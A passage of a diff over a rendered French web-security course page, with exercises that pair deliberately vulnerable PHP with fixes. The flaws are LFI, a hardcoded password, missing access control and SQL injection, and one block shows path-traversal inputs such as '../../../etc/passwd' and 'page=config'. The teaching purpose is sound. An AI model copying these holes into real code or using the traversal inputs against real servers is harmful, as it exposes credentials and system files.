+<span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_METHOD'</span><span class="p">]</span> <span class="o">===</span> <span class="s1">'POST'</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'token'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">hash_equals</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'token'</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'token'</span><span class="p">]))</span> <span class="p">{</span>
         <span class="c1">// Consommer le token (usage unique)</span>
-        <span class="nb">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">]);</span>
+        <span class="nb">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'token'</span><span class="p">]);</span>
 
-        <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">&quot;DELETE FROM user WHERE id = ?&quot;</span><span class="p">);</span>
-        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">([</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]]);</span>
+        <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"DELETE FROM user WHERE id = ?"</span><span class="p">);</span>
+        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">([</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]]);</span>
     <span class="p">}</span>
 <span class="p">}</span>
 <span class="cp">?&gt;</span>
 
-<span class="x">&lt;div class=&quot;container&quot;&gt;</span>
+<span class="x">&lt;div class="container"&gt;</span>
 <span class="x">    &lt;h1&gt;Exercice 3&lt;/h1&gt;</span>
 <span class="x">    &lt;p&gt;Voici la liste des utilisateurs :&lt;/p&gt;</span>
 <span class="x">    &lt;ul&gt;</span>
 <span class="x">        &lt;li&gt;</span>
 <span class="x">            Utilisateur 1</span>
 <span class="x">            &lt;!-- Formulaire POST avec token CSRF caché --&gt;</span>
-<span class="x">            &lt;form method=&quot;post&quot; action=&quot;index.php&quot;&gt;</span>
-<span class="x">                &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;1&quot;&gt;</span>
-<span class="x">                &lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;</span><span class="cp">&lt;?</span><span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">]</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
-<span class="x">                &lt;button type=&quot;submit&quot;&gt;Supprimer&lt;/button&gt;</span>
+<span class="x">            &lt;form method="post" action="index.php"&gt;</span>
+<span class="x">                &lt;input type="hidden" name="id" value="1"&gt;</span>
+<span class="x">                &lt;input type="hidden" name="token" value="</span><span class="cp">&lt;?</span><span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'token'</span><span class="p">]</span> <span class="cp">?&gt;</span><span class="x">"&gt;</span>
+<span class="x">                &lt;button type="submit"&gt;Supprimer&lt;/button&gt;</span>
 <span class="x">            &lt;/form&gt;</span>
 <span class="x">        &lt;/li&gt;</span>
 <span class="x">    &lt;/ul&gt;</span>
@@ -7273,7 +7273,7 @@ Le navigateur de l'admin charge l'image → la suppression est déclenchée à s
 <p>L'auditeur a trouvé une faille de type Inclusion de fichier. Il a réussi à afficher le contenu du fichier <code>config.php</code>.</p>
 <p>Le code source ou la faille se trouve est le suivant :</p>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span>
-<span class="k">include</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;.php&#39;</span><span class="p">;</span>
+<span class="k">include</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">]</span> <span class="o">.</span> <span class="s1">'.php'</span><span class="p">;</span>
 
 <span class="c1">// Exemple : index.php?page=config</span>
 <span class="cp">?&gt;</span>
@@ -7288,23 +7288,23 @@ Le navigateur de l'admin charge l'image → la suppression est déclenchée à s
 <p><strong>Nature de la faille</strong></p>
 <p><code>include</code> avec un paramètre GET non filtré constitue une <strong>LFI (Local File Inclusion)</strong>. Un attaquant peut accéder à n'importe quel fichier <code>.php</code> du serveur :
 <div class="language-text highlight"><span class="filename">📋 Texte</span><pre><span></span><code>?page=config         → inclut config.php (identifiants BDD)
-?page=../../../etc/passwd  → avec manipulation de chemin (si pas d&#39;extension forcée)
+?page=../../../etc/passwd  → avec manipulation de chemin (si pas d'extension forcée)
 </code></pre></div></p>
 <p><strong>Correction : liste blanche de pages autorisées</strong></p>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span>
 <span class="c1">// Liste des pages autorisées (liste blanche)</span>
-<span class="nv">$pagesAutorisees</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;accueil&#39;</span><span class="p">,</span> <span class="s1">&#39;contact&#39;</span><span class="p">,</span> <span class="s1">&#39;apropos&#39;</span><span class="p">];</span>
+<span class="nv">$pagesAutorisees</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'accueil'</span><span class="p">,</span> <span class="s1">'contact'</span><span class="p">,</span> <span class="s1">'apropos'</span><span class="p">];</span>
 
-<span class="nv">$page</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]</span> <span class="o">??</span> <span class="s1">&#39;accueil&#39;</span><span class="p">;</span>
+<span class="nv">$page</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">]</span> <span class="o">??</span> <span class="s1">'accueil'</span><span class="p">;</span>
 
 <span class="c1">// Vérifier que la page demandée est dans la liste</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$page</span><span class="p">,</span> <span class="nv">$pagesAutorisees</span><span class="p">,</span> <span class="k">true</span><span class="p">))</span> <span class="p">{</span>
-    <span class="c1">// Page non autorisée : on redirige vers l&#39;accueil ou on renvoie une 404</span>
+    <span class="c1">// Page non autorisée : on redirige vers l'accueil ou on renvoie une 404</span>
     <span class="nb">http_response_code</span><span class="p">(</span><span class="mi">404</span><span class="p">);</span>
-    <span class="nv">$page</span> <span class="o">=</span> <span class="s1">&#39;404&#39;</span><span class="p">;</span>
+    <span class="nv">$page</span> <span class="o">=</span> <span class="s1">'404'</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="k">include</span> <span class="nv">$page</span> <span class="o">.</span> <span class="s1">&#39;.php&#39;</span><span class="p">;</span>
+<span class="k">include</span> <span class="nv">$page</span> <span class="o">.</span> <span class="s1">'.php'</span><span class="p">;</span>
 <span class="cp">?&gt;</span>
 </code></pre></div>
 <p><strong>Points clés :</strong></p>
@@ -7319,23 +7319,23 @@ Le navigateur de l'admin charge l'image → la suppression est déclenchée à s
 <p>Le code source ou la faille se trouve est le suivant :</p>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span>
 
-<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]))</span> <span class="p">{</span>
-    <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nv">$password</span> <span class="o">===</span> <span class="s1">&#39;123456&#39;</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;Vous êtes connecté&lt;/p&gt;&quot;</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">];</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$password</span> <span class="o">===</span> <span class="s1">'123456'</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">"&lt;p&gt;Vous êtes connecté&lt;/p&gt;"</span><span class="p">;</span>
     <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-        <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;Mot de passe incorrect&lt;/p&gt;&quot;</span><span class="p">;</span>
+        <span class="k">echo</span> <span class="s2">"&lt;p&gt;Mot de passe incorrect&lt;/p&gt;"</span><span class="p">;</span>
     <span class="p">}</span>
 <span class="p">}</span>
 
 <span class="cp">?&gt;</span>
 
-<span class="x">&lt;form method=&quot;post&quot;&gt;</span>
-<span class="x">    &lt;div class=&quot;form-group&quot;&gt;</span>
-<span class="x">        &lt;label for=&quot;password&quot;&gt;Mot de passe&lt;/label&gt;</span>
-<span class="x">        &lt;input type=&quot;password&quot; class=&quot;form-control&quot; id=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Mot de passe&quot;&gt;</span>
+<span class="x">&lt;form method="post"&gt;</span>
+<span class="x">    &lt;div class="form-group"&gt;</span>
+<span class="x">        &lt;label for="password"&gt;Mot de passe&lt;/label&gt;</span>
+<span class="x">        &lt;input type="password" class="form-control" id="password" name="password" placeholder="Mot de passe"&gt;</span>
 <span class="x">    &lt;/div&gt;</span>
-<span class="x">    &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Envoyer&lt;/button&gt;</span>
+<span class="x">    &lt;button type="submit" class="btn btn-primary"&gt;Envoyer&lt;/button&gt;</span>
 <span class="x">&lt;/form&gt;</span>
 </code></pre></div>
 <div class="admonition tip">
@@ -7359,44 +7359,44 @@ Le navigateur de l'admin charge l'image → la suppression est déclenchée à s
 <span class="nb">session_start</span><span class="p">();</span>
 
 <span class="c1">// Initialiser le compteur de tentatives</span>
-<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;tentatives&#39;</span><span class="p">]))</span> <span class="p">{</span>
-    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;tentatives&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'tentatives'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'tentatives'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 
 <span class="nv">$maxTentatives</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
-<span class="nv">$messageErreur</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+<span class="nv">$messageErreur</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
 
-<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]))</span> <span class="p">{</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]))</span> <span class="p">{</span>
 
     <span class="c1">// Bloquer si trop de tentatives</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;tentatives&#39;</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="nv">$maxTentatives</span><span class="p">)</span> <span class="p">{</span>
-        <span class="nv">$messageErreur</span> <span class="o">=</span> <span class="s2">&quot;Compte temporairement bloqué. Réessayez plus tard.&quot;</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'tentatives'</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="nv">$maxTentatives</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$messageErreur</span> <span class="o">=</span> <span class="s2">"Compte temporairement bloqué. Réessayez plus tard."</span><span class="p">;</span>
     <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;tentatives&#39;</span><span class="p">]</span><span class="o">++</span><span class="p">;</span>
+        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'tentatives'</span><span class="p">]</span><span class="o">++</span><span class="p">;</span>
 
         <span class="c1">// Ajouter un délai pour ralentir les attaques automatisées</span>
         <span class="nb">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
 
-        <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
-        <span class="k">if</span> <span class="p">(</span><span class="nv">$password</span> <span class="o">===</span> <span class="s1">&#39;123456&#39;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">];</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$password</span> <span class="o">===</span> <span class="s1">'123456'</span><span class="p">)</span> <span class="p">{</span>
             <span class="c1">// Réinitialiser le compteur en cas de succès</span>
-            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;tentatives&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-            <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;Vous êtes connecté&lt;/p&gt;&quot;</span><span class="p">;</span>
+            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'tentatives'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+            <span class="k">echo</span> <span class="s2">"&lt;p&gt;Vous êtes connecté&lt;/p&gt;"</span><span class="p">;</span>
         <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-            <span class="nv">$messageErreur</span> <span class="o">=</span> <span class="s2">&quot;Mot de passe incorrect. Tentative &quot;</span> 
-                <span class="o">.</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;tentatives&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;/</span><span class="si">$maxTentatives</span><span class="s2">&quot;</span><span class="p">;</span>
+            <span class="nv">$messageErreur</span> <span class="o">=</span> <span class="s2">"Mot de passe incorrect. Tentative "</span> 
+                <span class="o">.</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'tentatives'</span><span class="p">]</span> <span class="o">.</span> <span class="s2">"/</span><span class="si">$maxTentatives</span><span class="s2">"</span><span class="p">;</span>
         <span class="p">}</span>
     <span class="p">}</span>
 <span class="p">}</span>
 <span class="cp">?&gt;</span>
 
 <span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$messageErreur</span><span class="p">)</span><span class="o">:</span> <span class="cp">?&gt;</span>
-<span class="x">    &lt;p style=&quot;color:red&quot;&gt;</span><span class="cp">&lt;?</span><span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$messageErreur</span><span class="p">)</span> <span class="cp">?&gt;</span><span class="x">&lt;/p&gt;</span>
+<span class="x">    &lt;p style="color:red"&gt;</span><span class="cp">&lt;?</span><span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$messageErreur</span><span class="p">)</span> <span class="cp">?&gt;</span><span class="x">&lt;/p&gt;</span>
 <span class="cp">&lt;?php</span> <span class="k">endif</span><span class="p">;</span> <span class="cp">?&gt;</span>
 
-<span class="x">&lt;form method=&quot;post&quot;&gt;</span>
-<span class="x">    &lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Mot de passe&quot;&gt;</span>
-<span class="x">    &lt;button type=&quot;submit&quot;&gt;Envoyer&lt;/button&gt;</span>
+<span class="x">&lt;form method="post"&gt;</span>
+<span class="x">    &lt;input type="password" name="password" placeholder="Mot de passe"&gt;</span>
+<span class="x">    &lt;button type="submit"&gt;Envoyer&lt;/button&gt;</span>
 <span class="x">&lt;/form&gt;</span>
 </code></pre></div>
 <p><strong>Solutions complémentaires à combiner :</strong></p>
@@ -7410,14 +7410,14 @@ Le navigateur de l'admin charge l'image → la suppression est déclenchée à s
 <h2 id="faille-6">Faille 6<a class="headerlink" href="#faille-6" title="Permanent link">⚓︎</a></h2>
 <p>L'attaquant a trouvé une faille de type manque de contrôle d'accès. Il a réussi à accéder à une page qui n'est pas accessible aux utilisateurs.</p>
 <p>Le code source ou la faille se trouve est le suivant :</p>
-<div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="x">// Routeur de l&#39;application</span>
+<div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="x">// Routeur de l'application</span>
 
 <span class="cp">&lt;?php</span>
 
-<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s1">&#39;HomeController@index&#39;</span><span class="p">);</span>
-<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;/admin&#39;</span><span class="p">,</span> <span class="s1">&#39;AdminController@index&#39;</span><span class="p">);</span>
+<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="s1">'HomeController@index'</span><span class="p">);</span>
+<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">'/admin'</span><span class="p">,</span> <span class="s1">'AdminController@index'</span><span class="p">);</span>
 <span class="c1">// …</span>
-<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;/admin/users&#39;</span><span class="p">,</span> <span class="s1">&#39;UserController@index&#39;</span><span class="p">);</span>
+<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">'/admin/users'</span><span class="p">,</span> <span class="s1">'UserController@index'</span><span class="p">);</span>
 </code></pre></div>
 <p>Proposez une solution pour corriger cette faille.</p>
 <details class="question">
@@ -7426,14 +7426,14 @@ Le navigateur de l'admin charge l'image → la suppression est déclenchée à s
 <p>Les routes <code>/admin</code> et <code>/admin/users</code> sont accessibles à <strong>tous les utilisateurs</strong>, connectés ou non. Il n'y a aucun contrôle d'accès (<strong>OWASP A01 : Broken Access Control</strong>).</p>
 <p><strong>Correction avec un middleware d'authentification et de rôle</strong></p>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span>
-<span class="c1">// Routeur de l&#39;application</span>
+<span class="c1">// Routeur de l'application</span>
 
-<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s1">&#39;HomeController@index&#39;</span><span class="p">);</span>
+<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="s1">'HomeController@index'</span><span class="p">);</span>
 
 <span class="c1">// Groupe protégé : authentification requise + rôle admin</span>
-<span class="nx">Route</span><span class="o">::</span><span class="na">middleware</span><span class="p">([</span><span class="s1">&#39;auth&#39;</span><span class="p">,</span> <span class="s1">&#39;admin&#39;</span><span class="p">])</span><span class="o">-&gt;</span><span class="na">group</span><span class="p">(</span><span class="k">function</span> <span class="p">()</span> <span class="p">{</span>
-    <span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;/admin&#39;</span><span class="p">,</span> <span class="s1">&#39;AdminController@index&#39;</span><span class="p">);</span>
-    <span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;/admin/users&#39;</span><span class="p">,</span> <span class="s1">&#39;UserController@index&#39;</span><span class="p">);</span>
+<span class="nx">Route</span><span class="o">::</span><span class="na">middleware</span><span class="p">([</span><span class="s1">'auth'</span><span class="p">,</span> <span class="s1">'admin'</span><span class="p">])</span><span class="o">-&gt;</span><span class="na">group</span><span class="p">(</span><span class="k">function</span> <span class="p">()</span> <span class="p">{</span>
+    <span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">'/admin'</span><span class="p">,</span> <span class="s1">'AdminController@index'</span><span class="p">);</span>
+    <span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">'/admin/users'</span><span class="p">,</span> <span class="s1">'UserController@index'</span><span class="p">);</span>
 <span class="p">});</span>
 </code></pre></div>
 <p><strong>Exemple de middleware <code>admin</code> (Laravel) :</strong></p>
@@ -7444,8 +7444,8 @@ Le navigateur de l'admin charge l'image → la suppression est déclenchée à s
 <span class="p">{</span>
     <span class="k">public</span> <span class="k">function</span> <span class="nf">handle</span><span class="p">(</span><span class="nx">Request</span> <span class="nv">$request</span><span class="p">,</span> <span class="nx">Closure</span> <span class="nv">$next</span><span class="p">)</span>
     <span class="p">{</span>
-        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">Auth</span><span class="o">::</span><span class="na">check</span><span class="p">()</span> <span class="o">||</span> <span class="nx">Auth</span><span class="o">::</span><span class="na">user</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">role</span> <span class="o">!==</span> <span class="s1">&#39;admin&#39;</span><span class="p">)</span> <span class="p">{</span>
-            <span class="nx">abort</span><span class="p">(</span><span class="mi">403</span><span class="p">,</span> <span class="s1">&#39;Accès refusé&#39;</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">Auth</span><span class="o">::</span><span class="na">check</span><span class="p">()</span> <span class="o">||</span> <span class="nx">Auth</span><span class="o">::</span><span class="na">user</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">role</span> <span class="o">!==</span> <span class="s1">'admin'</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">abort</span><span class="p">(</span><span class="mi">403</span><span class="p">,</span> <span class="s1">'Accès refusé'</span><span class="p">);</span>
         <span class="p">}</span>
         <span class="k">return</span> <span class="nv">$next</span><span class="p">(</span><span class="nv">$request</span><span class="p">);</span>
     <span class="p">}</span>
@@ -7463,10 +7463,10 @@ Le navigateur de l'admin charge l'image → la suppression est déclenchée à s
 <p>Identifiez les failles de sécurité dans le code source suivant :</p>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span>
 
-<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">]))</span> <span class="p">{</span>
-    <span class="nv">$name</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
-    <span class="nv">$email</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">];</span>
-    <span class="nv">$request</span> <span class="o">=</span> <span class="s2">&quot;INSERT INTO users (name, email) VALUES (&#39;</span><span class="si">$name</span><span class="s2">&#39;, &#39;</span><span class="si">$email</span><span class="s2">&#39;)&quot;</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$name</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">];</span>
+    <span class="nv">$email</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">];</span>
+    <span class="nv">$request</span> <span class="o">=</span> <span class="s2">"INSERT INTO users (name, email) VALUES ('</span><span class="si">$name</span><span class="s2">', '</span><span class="si">$email</span><span class="s2">')"</span><span class="p">;</span>
     <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">exec</span><span class="p">(</span><span class="nv">$request</span><span class="p">);</span>
 <span class="p">}</span>
 <span class="cp">?&gt;</span>
@@ -7482,18 +7482,18 @@ Le navigateur de l'admin charge l'image → la suppression est déclenchée à s
 </ol>
 <p><strong>Correction</strong></p>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span>
-<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">]))</span> <span class="p">{</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]))</span> <span class="p">{</span>
     <span class="c1">// 1. Assainir les entrées</span>
-    <span class="nv">$name</span>  <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]),</span>  <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">&#39;UTF-8&#39;</span><span class="p">);</span>
-    <span class="nv">$email</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">&#39;email&#39;</span><span class="p">,</span> <span class="nx">FILTER_VALIDATE_EMAIL</span><span class="p">);</span>
+    <span class="nv">$name</span>  <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]),</span>  <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
+    <span class="nv">$email</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">'email'</span><span class="p">,</span> <span class="nx">FILTER_VALIDATE_EMAIL</span><span class="p">);</span>
 
-    <span class="c1">// 2. Valider l&#39;email</span>
+    <span class="c1">// 2. Valider l'email</span>
     <span class="k">if</span> <span class="p">(</span><span class="nv">$email</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">exit</span><span class="p">(</span><span class="s1">&#39;Adresse email invalide&#39;</span><span class="p">);</span>
+        <span class="k">exit</span><span class="p">(</span><span class="s1">'Adresse email invalide'</span><span class="p">);</span>
     <span class="p">}</span>
 
-    <span class="c1">// 3. Requête préparée (protège contre l&#39;injection SQL)</span>
-    <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">&quot;INSERT INTO users (name, email) VALUES (?, ?)&quot;</span><span class="p">);</span>
+    <span class="c1">// 3. Requête préparée (protège contre l'injection SQL)</span>
+    <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"INSERT INTO users (name, email) VALUES (?, ?)"</span><span class="p">);</span>
     <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">([</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$email</span><span class="p">]);</span>
 <span class="p">}</span>
 <span class="cp">?&gt;</span>
@@ -7509,10 +7509,10 @@ Le navigateur de l'admin charge l'image → la suppression est déclenchée à s
 <p>Identifiez les failles de sécurité dans le code source suivant :</p>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span>
 
-<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">]))</span> <span class="p">{</span>
-    <span class="nv">$name</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
